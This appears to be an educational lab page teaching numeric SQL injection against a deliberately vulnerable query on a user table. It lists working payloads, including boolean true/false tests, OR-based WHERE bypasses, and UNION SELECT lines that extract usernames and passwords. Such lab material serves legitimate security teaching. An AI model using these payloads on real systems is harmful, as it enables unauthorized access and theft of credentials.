Lab 2: Numeric SQL Injection
Learn numeric-based SQL injection without quotes
Objective: This lab demonstrates numeric-based SQL injection. The query structure is: SELECT id, username, password FROM labsPage_user WHERE id = {user_id}

Numeric Injection Strategy: Since the ID parameter is numeric (no quotes), use these techniques:
  • 1 AND 1=1 - Test for true condition (should return normal result)
  • 1 AND 1=2 - Test for false condition (should return no result)
  • 1 OR 1=1 - Always true condition (bypasses WHERE clause)
  • 1 UNION SELECT ... - Combine results from multiple queries
  • 999 OR 1=1 - Invalid ID but always true condition

Numeric SQL Injection Hints
Basic Logic Tests:
True condition: 1 AND 1=1
False condition: 1 AND 1=2
OR bypass: 1 OR 1=1
Invalid ID bypass: 999 OR 1=1
UNION Attacks:
Column count: 1 UNION SELECT 1,2,3
All users: 1 UNION SELECT id,username,password FROM labsPage_user
